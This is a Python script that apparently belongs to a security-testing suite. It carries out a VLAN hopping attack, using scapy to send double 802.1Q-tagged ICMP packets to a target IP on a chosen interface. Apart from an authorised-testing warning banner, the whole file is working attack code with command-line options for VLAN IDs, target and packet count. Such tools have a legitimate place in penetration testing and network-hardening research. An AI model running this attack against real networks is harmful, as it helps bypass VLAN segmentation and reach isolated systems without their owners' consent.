#!/usr/bin/env python3
"""
VLAN Hopping Attack Simulation

Simulates VLAN hopping using double tagging or switch spoofing.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, time, argparse
from typing import Dict, Any

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, conf
except ImportError:
    logger.error("Requires scapy: pip install scapy")
    sys.exit(1)

conf.verb = 0


class VLANHoppingAttack:
    """VLAN hopping attack simulator."""

    def __init__(self, interface: str, outer_vlan: int, inner_vlan: int, target_ip: str, count: int = 10, verbose: bool = False):
        self.interface = interface
        self.outer_vlan = outer_vlan
        self.inner_vlan = inner_vlan
        self.target_ip = target_ip
        self.count = count
        self.verbose = verbose
        self.packets_sent = 0
        conf.verb = 1 if verbose else 0
        logger.info(f"Initialized VLAN hopping: outer={outer_vlan}, inner={inner_vlan}")

    def execute(self) -> Dict[str, Any]:
        """Execute the VLAN hopping attack."""
        logger.info(f"Starting VLAN hopping with double tagging")
        start_time = time.time()

        try:
            for i in range(1, self.count + 1):
                # Double VLAN tagging
                packet = (Ether()/
                         Dot1Q(vlan=self.outer_vlan)/
                         Dot1Q(vlan=self.inner_vlan)/
                         IP(dst=self.target_ip)/
                         ICMP())
                sendp(packet, iface=self.interface, verbose=0)
                self.packets_sent += 1

                if self.verbose:
                    logger.debug(f"Sent packet {i}/{self.count}")

            logger.info("VLAN hopping completed")
        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            duration = time.time() - start_time
            stats = {"packets_sent": self.packets_sent, "duration_seconds": duration}
            logger.info(f"Sent {stats['packets_sent']} packets in {stats['duration_seconds']:.2f}s")
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="VLAN Hopping Attack Simulation")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("--outer-vlan", type=int, required=True, help="Outer VLAN ID")
    parser.add_argument("--inner-vlan", type=int, required=True, help="Inner VLAN ID")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-c", "--count", type=int, default=10, help="Number of packets")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()
        attack = VLANHoppingAttack(args.interface, args.outer_vlan, args.inner_vlan, args.target, args.count, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
